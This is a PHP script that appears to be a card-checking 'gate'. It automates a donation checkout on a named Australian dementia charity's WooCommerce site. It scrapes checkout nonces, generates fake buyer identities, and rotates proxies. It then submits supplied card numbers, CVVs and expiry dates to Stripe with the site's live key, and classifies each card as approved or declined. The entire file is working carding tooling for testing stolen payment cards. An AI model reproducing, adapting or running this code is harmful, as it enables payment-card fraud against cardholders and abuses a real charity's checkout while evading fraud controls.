<?php

$retry = 0;

$isRetry = False;

start:

if ($isRetry) {
	$retry++;

	$this->curlx->DeleteCookie();
}

if ($retry > 2) {
	if (empty($empty)) $empty = 'Maximum Retrys Reached';

	$status = ['emoji' => '❌', 'status' => 'DECLINED', 'msg' => "RETRY - $empty!"];

	goto end;
}

$isRetry = True;

$server = $this->proxy();

$cookie = uniqid();

$fake = $this->tools->GetUser();

$r1 = $this->curlx->Get('https://umbrelladementiacafes.com.au/product/make-a-donation/', null, $cookie, $server['proxy']);

if (!$r1->success) goto start;

$nonce = $this->getstr($r1->body, 'name="woocommerce-process-checkout-nonce" value="', '"');

$cart_nonce = $this->getstr($r1->body, '"wcopc_nonce":"', '"');

if (empty($nonce) || empty($cart_nonce)) {
	$empty = 'First Request Tokens are Empty';

	goto start;
}

$data = 'action=pp_add_to_cart&nonce='.$cart_nonce.'&input_data=nyp-opc-1435%3D1.00%26apbct_visible_fields%3DeyIwIjp7InZpc2libGVfZmllbGRzIjoibnlwLW9wYy0xNDM1IHF1YW50aXR5IiwidmlzaWJsZV9maWVsZHNfY291bnQiOjIsImludmlzaWJsZV9maWVsZHMiOiIiLCJpbnZpc2libGVfZmllbGRzX2NvdW50IjowfX0%253D&add_to_cart=1435&quantity=1';

$r2 = $this->curlx->Post('https://umbrelladementiacafes.com.au/wp-admin/admin-ajax.php', $data, null, $cookie, $server['proxy']);

if (!$r2->success) goto start;

$update_key = $this->getstr($r2->body, '"key":"', '"');

if (empty($update_key)) {
	$empty = 'Second Request Token is Empty';

	goto start;
}

$data = 'type=card&owner[name]='.$fake->first.'+'.$fake->last.'&owner[address][city]=Brewster&owner[address][country]=US&owner[email]='.urlencode($fake->email).'&card[number]='.$cc.'&card[cvc]='.$cvv.'&card[exp_month]='.$mm.'&card[exp_year]='.$yyyy.'&guid=NA&muid=NA&sid=NA&payment_user_agent=stripe.js%2Facd3f7780%3B+stripe-js-v3%2Facd3f7780&time_on_page='.rand(50000, 100000).'&key=pk_live_51H9imaHQXZ6qK6CA5rtxsUrBBlVI9iP7jOxgNv5CSVKpRhtCPbj1My18OPefxtvkohYRsIqmDIswYNM26GIcP1MZ005O7vyJHF';

$r3 = $this->curlx->Post('https://api.stripe.com/v1/sources', $data, null, $cookie, $server['proxy']);

if (!$r3->success) goto start;

$json_r3 = json_decode($r3->body);

if (isset($json_r3->error)) {
	$this->curlx->DeleteCookie();

	$status = $this->response->ErrorHandler($json_r3->error);

	goto end;
}

$src = $json_r3->id;

$data = 'billing_first_name='.$fake->first.'&billing_last_name='.$fake->last.'&billing_email='.urlencode($fake->email).'&billing_country=US&wc_apbct_email_id=&billing_city=Brewster&is_opc=1&cart%5B'.$update_key.'%5D%5Bqty%5D=3&payment_method=stripe&terms=on&terms-field=1&woocommerce-process-checkout-nonce='.$nonce.'&_wp_http_referer=%2F%3Fwc-ajax%3Dupdate_order_review&apbct_visible_fields=eyIwIjp7InZpc2libGVfZmllbGRzIjoiYmlsbGluZ19maXJzdF9uYW1lIGJpbGxpbmdfbGFzdF9uYW1lIGJpbGxpbmdfZW1haWwgYmlsbGluZ19jb3VudHJ5IHdjX2FwYmN0X2VtYWlsX2lkIGJpbGxpbmdfY2l0eSBjYXJ0WzhiOGU5NDkyMGJjYTAzOTg5OWU4ZDNiNmJlZDExY2MwXVtxdHldIiwidmlzaWJsZV9maWVsZHNfY291bnQiOjcsImludmlzaWJsZV9maWVsZHMiOiJpc19vcGMgdGVybXMtZmllbGQgd29vY29tbWVyY2UtcHJvY2Vzcy1jaGVja291dC1ub25jZSBfd3BfaHR0cF9yZWZlcmVyIiwiaW52aXNpYmxlX2ZpZWxkc19jb3VudCI6NH19&stripe_source='.$src;

$r4 = $this->curlx->Post('https://umbrelladementiacafes.com.au/?wc-ajax=checkout', $data, null, $cookie, $server['proxy']);

if (!$r4->success) goto start;

$this->curlx->DeleteCookie();

$msg = $this->getstr($r4->body, 'messages":"', '","');

$err = trim(strip_tags(empty($tmp = $this->getstr($msg, '<li>\n\t\t\t', '\t')) ? $msg : $tmp));

$status = $this->response->Stripe($r4->body, $err);

end: